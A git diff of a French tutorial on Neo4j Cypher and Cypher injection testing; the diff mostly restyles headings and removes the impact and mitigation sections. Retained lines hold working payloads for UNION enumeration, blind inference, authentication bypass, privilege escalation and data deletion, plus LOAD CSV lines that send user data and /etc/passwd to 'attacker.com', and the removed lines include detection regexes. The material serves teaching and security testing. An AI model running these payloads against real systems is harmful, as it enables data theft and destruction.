@@ -63,9 +63,9 @@ RETURN ami_d_ami.nom
 
 ***
 
-### 2. Commandes Cypher Essentielles
+### <mark style="color:red;">2. Commandes Cypher Essentielles</mark>
 
-#### 2.1 Structure Générale d'une Requête Cypher
+#### <mark style="color:green;">2.1 Structure Générale d'une Requête Cypher</mark>
 
 ```cypher
 // Pattern général : VERBE (pattern) [WHERE condition] [RETURN result]
@@ -77,7 +77,7 @@ ORDER BY n.nom
 LIMIT 10
 ```
 
-#### 2.2 MATCH - La Fondation de Cypher
+#### <mark style="color:green;">2.2 MATCH - La Fondation de Cypher</mark>
 
 **MATCH** est l'équivalent de **SELECT** en SQL, mais bien plus puissant :
 
@@ -131,7 +131,7 @@ WHERE NOT (u)-[:BLOQUE]->(:Utilisateur {nom: 'Spam'})
 RETURN u.nom
 ```
 
-#### 2.3 CREATE - Création de Données
+#### <mark style="color:green;">2.3 CREATE - Création de Données</mark>
 
 ```cypher
 // 👤 Créer un nœud simple
@@ -156,7 +156,7 @@ RETURN u.nom + ' créé avec succès' AS message
 CREATE (admin:Utilisateur:Administrateur {nom: 'Admin', niveau: 10})
 ```
 
-#### 2.4 SET - Mise à Jour de Propriétés
+#### <mark style="color:green;">2.4 SET - Mise à Jour de Propriétés</mark>
 
 ```cypher
 // ✏️ Mettre à jour une propriété
@@ -186,7 +186,7 @@ WHERE u.age < 18
 SET u.statut = 'mineur'
 ```
 
-#### 2.5 DELETE et DETACH DELETE - Suppression
+#### <mark style="color:green;">2.5 DELETE et DETACH DELETE - Suppression</mark>
 
 ```cypher
 // 🗑️ Supprimer un nœud (sans relations)
@@ -210,7 +210,7 @@ DETACH DELETE u
 MATCH (n) DETACH DELETE n
 ```
 
-#### 2.6 UNION - Combiner des Résultats
+#### <mark style="color:green;">2.6 UNION - Combiner des Résultats</mark>
 
 ```cypher
 // 🔄 UNION standard (sans doublons)
@@ -242,7 +242,7 @@ MATCH (user:Utilisateur)
 RETURN user.nom AS nom, 'User' AS type
 ```
 
-#### 2.7 WITH - Chaînage de Requêtes
+#### <mark style="color:green;">2.7 WITH - Chaînage de Requêtes</mark>
 
 ```cypher
 // 🔗 Chaînage simple
@@ -273,7 +273,7 @@ WITH u, amis, collect(suivi) AS suivis
 RETURN u.nom, size(amis) AS nb_amis, size(suivis) AS nb_suivis
 ```
 
-#### 2.8 WHERE - Filtrage Avancé
+#### <mark style="color:green;">2.8 WHERE - Filtrage Avancé</mark>
 
 ```cypher
 // 🎯 Conditions de base
@@ -313,7 +313,7 @@ WHERE size((u)-[:AMI]->()) > 5  // Plus de 5 amis
 RETURN u.nom
 ```
 
-#### 2.9 ORDER BY et LIMIT - Tri et Pagination
+#### <mark style="color:green;">2.9 ORDER BY et LIMIT - Tri et Pagination</mark>
 
 ```cypher
 // 📈 Tri croissant
@@ -345,7 +345,7 @@ ORDER BY nb_posts DESC
 LIMIT 5  // Top 5 auteurs
 ```
 
-#### 2.10 Fonctions d'Agrégation
+#### <mark style="color:green;">2.10 Fonctions d'Agrégation</mark>
 
 ```cypher
 // 🔢 Fonctions de base
@@ -372,9 +372,9 @@ RETURN collect(u.nom)[..5] AS echantillon_5_users
 
 ***
 
-### 3. Visualisation des Bases de Données Graphiques
+### <mark style="color:blue;">3. Visualisation des Bases de Données Graphiques</mark>
 
-#### 3.1 Représentation Visuelle vs Tabulaire
+#### <mark style="color:green;">3.1 Représentation Visuelle vs Tabulaire</mark>
 
 ```
 📊 BASE RELATIONNELLE (SQL) :
@@ -402,7 +402,7 @@ Table: amities
      ville:"Paris"}            ville:"Lyon"}
 ```
 
-#### 3.2 Exemples de Structures Graphiques
+#### <mark style="color:green;">3.2 Exemples de Structures Graphiques</mark>
 
 **Réseau Social**
 
@@ -439,9 +439,9 @@ Table: amities
 
 ***
 
-### 4. Comprendre les Injections Cypher
+### <mark style="color:blue;">4. Comprendre les Injections Cypher</mark>
 
-#### 4.1 Définition et Mécanisme
+#### <mark style="color:green;">4.1 Définition et Mécanisme</mark>
 
 Une **injection Cypher** exploite la construction dynamique de requêtes en injectant du code malveillant dans les paramètres utilisateur.
 
@@ -454,7 +454,7 @@ Une **injection Cypher** exploite la construction dynamique de requêtes en inje
 4️⃣ Attaquant obtient accès non autorisé aux données
 ```
 
-#### 4.2 Anatomie d'une Injection
+#### <mark style="color:green;">4.2 Anatomie d'une Injection</mark>
 
 **Code Vulnérable Typique**
 
@@ -486,7 +486,7 @@ MATCH (u:Utilisateur) WHERE u.nom = 'Alice' OR 1=1 RETURN u//' RETURN u
                             // Commente le reste ───┘
 ```
 
-#### 4.3 Pourquoi Cypher est Particulièrement Vulnérable
+#### <mark style="color:green;">4.3 Pourquoi Cypher est Particulièrement Vulnérable</mark>
 
 ```
 🔗 Flexibilité des Clauses :
@@ -504,9 +504,9 @@ MATCH (u:Utilisateur) WHERE u.nom = 'Alice' OR 1=1 RETURN u//' RETURN u
 
 ***
 
-### 5. Types d'Injections Cypher
+### <mark style="color:blue;">5. Types d'Injections Cypher</mark>
 
-#### 5.1 Injection In-Band (Dans la Bande)
+#### <mark style="color:green;">5.1 Injection In-Band (Dans la Bande)</mark>
 
 Les résultats malveillants sont directement visibles dans la réponse de l'application.
 
@@ -530,6 +530,7 @@ MATCH (u:Utilisateur) WHERE u.nom CONTAINS 'Alice' OR 1=1 RETURN u//' RETURN u
 
 **🔗 Injection avec UNION**
 
+{% code fullWidth="true" %}
 ```cypher
 // Application : Profil utilisateur par ID  
 GET /profile/42
@@ -548,6 +549,7 @@ id = 42 RETURN "dummy" AS nom, "dummy" AS email UNION CALL db.labels() YIELD lab
   {"nom": "Commande", "email": "system"}
 ]
 ```
+{% endcode %}
 
 **📊 Schéma In-Band**
 
@@ -562,7 +564,7 @@ id = 42 RETURN "dummy" AS nom, "dummy" AS email UNION CALL db.labels() YIELD lab
          (3) Réponse avec données      Exécution
 ```
 
-#### 5.2 Injection Aveugle (Blind)
+#### <mark style="color:green;">5.2 Injection Aveugle (Blind)</mark>
 
 Aucun résultat direct, mais inférence possible via le comportement de l'application.
 
@@ -603,7 +605,7 @@ payload2 = ' AND EXISTS((u:Utilisateur {role:'superadmin'}))) AND '1'='1
    (Inférence des données)
 ```
 
-#### 5.3 Injection Out-of-Band
+#### <mark style="color:blue;">5.3 Injection Out-of-Band</mark>
 
 Exfiltration des données vers un serveur contrôlé par l'attaquant.
 
@@ -644,8 +646,6 @@ GET /collect?data=Commande
    (Analyse des données)
 ```
 
-#### 5.4 Comparaison des Types
-
 | Type              | Visibilité    | Complexité   | Détection    | Cas d'usage               |
 | ----------------- | ------------- | ------------ | ------------ | ------------------------- |
 | **In-Band**       | 👁️ Directe   | ⭐ Simple     | 🚨 Facile    | Tests initiaux            |
@@ -655,9 +655,9 @@ GET /collect?data=Commande
 
 ***
 
-### 6. Méthodologie de Test
+### <mark style="color:blue;">6. Méthodologie de Test</mark>
 
-#### 6.1 Cartographie des Points d'Entrée
+#### <mark style="color:green;">6.1 Cartographie des Points d'Entrée</mark>
 
 **🎯 Zones à Auditer**
 
@@ -700,7 +700,7 @@ const patterns_vulnerables = [
 ];
 ```
 
-#### 6.2 Détection Systématique
+#### <mark style="color:green;">6.2 Détection Systématique</mark>
 
 **🔍 Phase 1 : Détection par Erreur**
 
@@ -757,7 +757,7 @@ Tests:
 ' OR FALSE //               -- Boolean explicite faux
 ```
 
-#### 6.3 Contexte d'Injection et Échappement
+#### <mark style="color:green;">6.3 Contexte d'Injection et Échappement</mark>
 
 **🧩 Analyse du Contexte d'Injection**
 
@@ -815,7 +815,7 @@ Payload: test' OR 1=1 RETURN u//
 Final: MATCH (u) WHERE u.nom = 'test' OR 1=1 RETURN u// RETURN u LIMIT 0
 ```
 
-#### 6.4 Outils et Automation
+#### <mark style="color:green;">6.4 Outils et Automation</mark>
 
 **🔧 Outils Spécialisés**
 
@@ -882,9 +882,9 @@ results = tester.test_endpoint("/api/search", "query")
 
 ***
 
-### 7. Techniques d'Exploitation
+### <mark style="color:blue;">7. Techniques d'Exploitation</mark>
 
-#### 7.1 Reconnaissance de la Base de Données
+#### <mark style="color:green;">7.1 Reconnaissance de la Base de Données</mark>
 
 **🕵️ Fingerprinting de la Base**
 
@@ -924,7 +924,7 @@ SHOW USERS YIELD user AS result //
 SHOW ROLES YIELD role AS result //
 ```
 
-#### 7.2 Exfiltration de Données Avancée
+#### <mark style="color:green;">7.2 Exfiltration de Données Avancée</mark>
 
 **📤 Méthodes In-Band**
 
@@ -958,7 +958,7 @@ SHOW ROLES YIELD role AS result //
 ' MATCH (u:Utilisateur) WITH apoc.text.base64Encode(u.nom + '|' + u.email) AS encoded LOAD CSV FROM 'https://attacker.com/b64/' + encoded AS r RETURN r //
 ```
 
-#### 7.3 Server-Side Request Forgery (SSRF)
+#### <mark style="color:green;">7.3 Server-Side Request Forgery (SSRF)</mark>
 
 **☁️ Métadonnées Cloud (AWS)**
 
@@ -989,7 +989,7 @@ SHOW ROLES YIELD role AS result //
 ' LOAD CSV FROM 'file:///etc/passwd' AS passwd LOAD CSV FROM 'https://attacker.com/files/' + passwd[0] AS r RETURN r //
 ```
 
-#### 7.4 Bypass d'Authentification
+#### <mark style="color:green;">7.4 Bypass d'Authentification</mark>
 
 **🔓 Techniques Classiques**
 
@@ -1014,7 +1014,7 @@ Payload email: admin@company.com' OR u.role = 'admin' WITH u MATCH (admin:User) 
 ' UNION MATCH (u:User)-[:HAS_TOKEN]->(token:MFAToken) WHERE token.valid = true RETURN u //
 ```
 
-#### 7.5 Élévation de Privilèges
+#### <mark style="color:green;">7.5 Élévation de Privilèges</mark>
 
 **📈 Modification de Rôles**
 
@@ -1039,7 +1039,7 @@ Payload: test" WITH u SET u.role = "admin", u.permissions = ["*"] RETURN u //
 ' UNION CALL dbms.security.addRoleToUser('admin', 'current_user') YIELD user RETURN user //
 ```
 
-#### 7.6 Techniques Destructives (⚠️ DANGER)
+#### <mark style="color:green;">7.6 Techniques Destructives (⚠️ DANGER)</mark>
 
 **💥 Suppression de Données**
 
@@ -1078,408 +1078,3 @@ Payload: test" WITH u SET u.role = "admin", u.permissions = ["*"] RETURN u //
 ```
 
 ***
-
-### 8. Impact et Dangers
-
-#### 8.1 Classification des Impacts
-
-```
-💥 IMPACT CRITIQUE (9.0-10.0 CVSS):
-├── Accès root à la base de données
-├── Exfiltration complète des données
-├── Suppression totale des données  
-└── Compromise de l'infrastructure
-
-🔥 IMPACT ÉLEVÉ (7.0-8.9 CVSS):
-├── Accès aux données sensibles
-├── Modification des permissions
-├── SSRF avec accès aux services internes
-└── Déni de service prolongé
-
-⚠️ IMPACT MOYEN (4.0-6.9 CVSS):
-├── Accès limité aux données
-├── Énumération des utilisateurs
-├── Bypass d'authentification ponctuel
-└── DoS temporaire
-
-ℹ️ IMPACT FAIBLE (0.1-3.9 CVSS):
-├── Divulgation d'informations mineures
-├── Énumération de la structure
-└── Erreurs révélatrices
-```
-
-#### 8.2 Scénarios d'Attaque Réels
-
-**🏢 Scenario 1: E-commerce**
-
-```
-🛍️ Application: Site de vente en ligne
-🎯 Point d'entrée: Recherche de produits
-💣 Injection: /search?q=laptop' UNION MATCH (u:User) RETURN u.email, u.creditcard //
-
-📊 Impact:
-├── 50,000 emails clients exposés
-├── 12,000 numéros de cartes de crédit
-├── Données de commandes historiques  
-└── Informations de livraison
-
-💰 Coût estimé: 2.5M€ (amendes RGPD + dommages)
-```
-
-**🏥 Scenario 2: Système de Santé**
-
-```
-🏥 Application: Dossiers médicaux électroniques  
-🎯 Point d'entrée: Recherche patient par nom
-💣 Injection: /patients/search?name=Smith' UNION MATCH (p:Patient)-[:HAS_CONDITION]->(c:MedicalCondition) RETURN p.ssn, c.diagnosis //
-
-📊 Impact:
-├── 100,000 dossiers médicaux exposés
-├── Diagnostics et traitements révélés
-├── Numéros de sécurité sociale
-└── Informations d'assurance santé
-
-💰 Coût estimé: 15M€ + poursuites judiciaires
-```
-
-**🏛️ Scenario 3: Infrastructure Gouvernementale**
-
-```
-🏛️ Application: Système de gestion des citoyens
-🎯 Point d'entrée: API de vérification d'identité  
-💣 Injection: SSRF vers métadonnées AWS + escalade
-
-📊 Impact:
-├── Accès aux bases de données nationales
-├── Informations de sécurité nationale
-├── Compromise de l'infrastructure cloud
-└── Accès à d'autres systèmes gouvernementaux
-
-💰 Coût estimé: Incalculable (sécurité nationale)
-```
-
-#### 8.3 Conséquences Techniques Spécifiques
-
-**🔗 Particularités des Bases Graphiques**
-
-```
-🕸️ PROPAGATION RAPIDE:
-   Les relations permettent l'accès rapide à des données connexes
-   
-   Exemple: User → Friend → Company → Employees → Salaries
-
-🔄 COMPOSITION DE REQUÊTES:
-   Possibilité d'ajouter des clauses arbitraires
-   Plus flexible que les injections SQL traditionnelles
-
-🌐 SSRF NATIF:  
-   LOAD CSV intégré = SSRF par design
-   Pas besoin de fonctions spéciales
-
-⚡ PERFORMANCES:
-   Requêtes mal formées peuvent paralyser la base
-   Traversées infinies possibles
-```
-
-#### 8.4 Impact sur la Conformité
-
-**📋 RGPD (Règlement Général sur la Protection des Données)**
-
-```
-🚫 VIOLATIONS POTENTIELLES:
-├── Article 5: Licéité du traitement (accès non autorisé)
-├── Article 25: Protection des données dès la conception
-├── Article 32: Sécurité du traitement  
-└── Article 33: Notification de violation (72h)
-
-💰 AMENDES:
-├── Niveau 1: Jusqu'à 10M€ ou 2% du CA annuel
-└── Niveau 2: Jusqu'à 20M€ ou 4% du CA annuel
-```
-
-**🏥 Secteur de la Santé (HIPAA, HDS)**
-
-```
-🚫 VIOLATIONS CRITIQUES:
-├── Accès non autorisé aux PHI (Protected Health Information)
-├── Divulgation involontaire de données médicales
-├── Manque de contrôles d'accès appropriés
-└── Absence de chiffrement des données sensibles
-
-💰 SANCTIONS:
-├── Amendes civiles: 100$ à 1.5M$ par violation
-├── Sanctions pénales: Jusqu'à 10 ans de prison
-└── Exclusion des programmes fédéraux
-```
-
-***
-
-### 9. Protection et Mitigation
-
-#### 9.1 Solution Principale: Requêtes Paramétrées
-
-**✅ Implémentation Correcte**
-
-```javascript
-// ✅ SÉCURISÉ - Neo4j JavaScript Driver
-const neo4j = require('neo4j-driver');
-
-// Requête paramétrée correcte
-async function getUserByName(session, nom) {
-    const result = await session.run(
-        'MATCH (u:Utilisateur) WHERE u.nom = $nom RETURN u',
-        { nom: nom }  // Paramètre sécurisé
-    );
-    return result.records;
-}
-
-// ✅ SÉCURISÉ - Multiples paramètres
-async function getUsersByFilter(session, nom, age, ville) {
-    const result = await session.run(
-        `MATCH (u:Utilisateur) 
-         WHERE u.nom = $nom AND u.age > $age AND u.ville = $ville 
-         RETURN u`,
-        { nom: nom, age: age, ville: ville }
-    );
-    return result.records;
-}
-```
-
-**❌ Implémentations Vulnérables à Éviter**
-
-```javascript
-// ❌ VULNÉRABLE - Concaténation de chaînes
-const query = "MATCH (u:Utilisateur) WHERE u.nom = '" + nom + "' RETURN u";
-
-// ❌ VULNÉRABLE - Template literals
-const query = `MATCH (u:Utilisateur) WHERE u.nom = '${nom}' RETURN u`;
-
-// ❌ VULNÉRABLE - Interpolation directe
-const query = util.format("MATCH (u) WHERE u.id = %d RETURN u", id);
-
-// ❌ VULNÉRABLE - Remplacement simple
-const query = "MATCH (u) WHERE u.nom = 'PLACEHOLDER' RETURN u".replace('PLACEHOLDER', nom);
-```
-
-#### 9.2 Validation et Filtrage des Entrées
-
-**🛡️ Validation Stricte**
-
-```javascript
-// ✅ Whitelist de caractères autorisés
-function validerNomUtilisateur(nom) {
-    const regex = /^[a-zA-Z0-9._-]{3,30}$/;
-    return regex.test(nom);
-}
-
-// ✅ Validation d'ID numérique
-function validerID(id) {
-    const numericId = parseInt(id, 10);
-    return !isNaN(numericId) && numericId > 0 && numericId < 999999999;
-}
-
-// ✅ Validation d'email
-function validerEmail(email) {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(email) && email.length <= 254;
-}
-
-// ✅ Échappement des caractères spéciaux (si nécessaire)
-function echapperCypher(input) {
-    return input
-        .replace(/\\/g, '\\\\')
-        .replace(/'/g, "\\'")
-        .replace(/"/g, '\\"')
-        .replace(/\n/g, '\\n')
-        .replace(/\r/g, '\\r');
-}
-```
-
-**🔒 Contrôles de Sécurité Avancés**
-
-```javascript
-// ✅ Limitation de la longueur
-const MAX_INPUT_LENGTH = 100;
-function validerLongueur(input) {
-    return typeof input === 'string' && input.length <= MAX_INPUT_LENGTH;
-}
-
-// ✅ Détection de patterns suspects
-function detecterInjection(input) {
-    const patternsSuspects = [
-        /\bUNION\b/i, /\bMATCH\b/i, /\bDELETE\b/i, 
-        /\bDROP\b/i, /\bCREATE\b/i, /\bSET\b/i,
-        /\bLOAD\s+CSV\b/i, /\bCALL\b/i, /\/\//, /\/\*/
-    ];
-    
-    return patternsSuspects.some(pattern => pattern.test(input));
-}
-
-// ✅ Middleware de validation Express.js
-const validationMiddleware = (req, res, next) => {
-    const { nom, id, email } = req.body;
-    
-    if (nom && !validerNomUtilisateur(nom)) {
-        return res.status(400).json({ error: 'Nom utilisateur invalide' });
-    }
-    
-    if (id && !validerID(id)) {
-        return res.status(400).json({ error: 'ID invalide' });
-    }
-    
-    if (email && !validerEmail(email)) {
-        return res.status(400).json({ error: 'Email invalide' });
-    }
-    
-    // Détection d'injection
-    const inputs = [nom, email].filter(Boolean);
-    if (inputs.some(detecterInjection)) {
-        console.log('🚨 Tentative d\'injection détectée:', req.ip);
-        return res.status(400).json({ error: 'Requête suspecte détectée' });
-    }
-    
-    next();
-};
-```
-
-#### 9.3 Configuration Sécurisée de Neo4j
-
-**🔧 Fichier neo4j.conf**
-
-```bash
-# 🛡️ Configuration sécurisée Neo4j
-
-# Désactiver l'import CSV depuis des URLs externes
-dbms.security.allow_csv_import_from_file_urls=false
-
-# Restreindre les procédures APOC dangereuses  
-dbms.security.procedures.unrestricted=apoc.load.*,apoc.import.*,apoc.export.*
-dbms.security.procedures.whitelist=apoc.path.*,apoc.coll.*,apoc.text.*
-
-# Limite des résultats pour éviter les extractions massives
-cypher.default_rows_limit=1000
-
-# Timeout des requêtes pour éviter les DoS
-dbms.transaction.timeout=30s
-dbms.transaction.bookmark_ready_timeout=30s
-
-# Logging de sécurité
-dbms.logs.query.enabled=true
-dbms.logs.query.threshold=1s
-dbms.logs.security.level=INFO
-
-# Restriction des imports
-server.directories.import=/var/lib/neo4j/import
-dbms.security.allow_csv_import_from_file_urls=false
-
-# Chiffrement en transit
-dbms.ssl.policy.bolt.enabled=true
-dbms.ssl.policy.https.enabled=true
-```
-
-#### 9.4 Contrôle d'Accès et RBAC
-
-**👥 Gestion des Rôles Neo4j**
-
-```cypher
--- 🔐 Création de rôles avec permissions limitées
-
--- Rôle lecture seule
-CREATE ROLE reader;
-GRANT READ ON GRAPH * TO reader;
-
--- Rôle application avec permissions limitées  
-CREATE ROLE app_user;
-GRANT READ ON GRAPH * TO app_user;
-GRANT WRITE ON GRAPH * TO app_user;
-DENY DELETE ON GRAPH * TO app_user;  -- Pas de suppression
-DENY DROP ON DATABASE * TO app_user; -- Pas de suppression de base
-
--- Utilisateur application
-CREATE USER app_service SET PASSWORD 'complex_password_123!';
-GRANT ROLE app_user TO app_service;
-
--- 🚫 Ne jamais utiliser le compte neo4j pour l'application !
--- Créer des comptes spécifiques avec permissions minimales
-```
-
-**🏛️ Architecture de Sécurité en Couches**
-
-```
-🏰 DEFENSE EN PROFONDEUR:
-
-┌─────────────────────────────────────────┐
-│  1. WAF (Web Application Firewall)     │
-│     - Filtrage des requêtes malveillantes│
-│     - Rate limiting                     │
-├─────────────────────────────────────────┤
-│  2. Application Layer                   │  
-│     - Validation des entrées            │
-│     - Requêtes paramétrées              │
-│     - Authentification forte            │
-├─────────────────────────────────────────┤
-│  3. Network Layer                       │
-│     - Segmentation réseau               │
-│     - Firewall interne                  │ 
-│     - VPN/Private networks              │
-├─────────────────────────────────────────┤
-│  4. Database Layer                      │
-│     - RBAC strict                       │
-│     - Audit logging                     │
-│     - Chiffrement                       │
-└─────────────────────────────────────────┘
-```
-
-#### 9.5 Monitoring et Détection
-
-**📊 Surveillance des Requêtes**
-
-```javascript
-// ✅ Middleware de logging des requêtes suspectes
-const suspiciousQueryLogger = (req, res, next) => {
-    const suspiciousPatterns = [
-        /UNION.*CALL/i, /LOAD.*CSV.*http/i, /DELETE.*MATCH/i,
-        /\/\*.*\*\//g, /\/\//, /\bdb\.labels\b/i,
-        /apoc\.util\.sleep/i, /DETACH.*DELETE/i
-    ];
-    
-    const queryString = JSON.stringify(req.query) + JSON.stringify(req.body);
-    
-    const isSuspicious = suspiciousPatterns.some(pattern => 
-        pattern.test(queryString)
-    );
-    
-    if (isSuspicious) {
-        console.log('🚨 ALERTE SÉCURITÉ - Requête suspecte détectée:');
-        console.log('IP:', req.ip);
-        console.log('User-Agent:', req.get('User-Agent')); 
-        console.log('Query:', queryString);
-        console.log('Timestamp:', new Date().toISOString());
-        
-        // Optionnel: bloquer la requête
-        // return res.status(403).json({ error: 'Accès refusé' });
-    }
-    
-    next();
-};
-```
-
-**📈 Métriques de Sécurité**
-
-```javascript
-// ✅ Compteurs de sécurité avec Prometheus/StatsD
-const securityMetrics = {
-    injectionAttempts: 0,
-    blockedRequests: 0,
-    suspiciousQueries: 0,
-    
-    recordInjectionAttempt(ip, userAgent) {
-        this.injectionAttempts++;
-        // Envoi vers système de monitoring
-        statsD.increment('security.injection_attempts', 1, {
-            ip: ip,
-            user_agent: userAgent
-        });
-    }
-};
-```
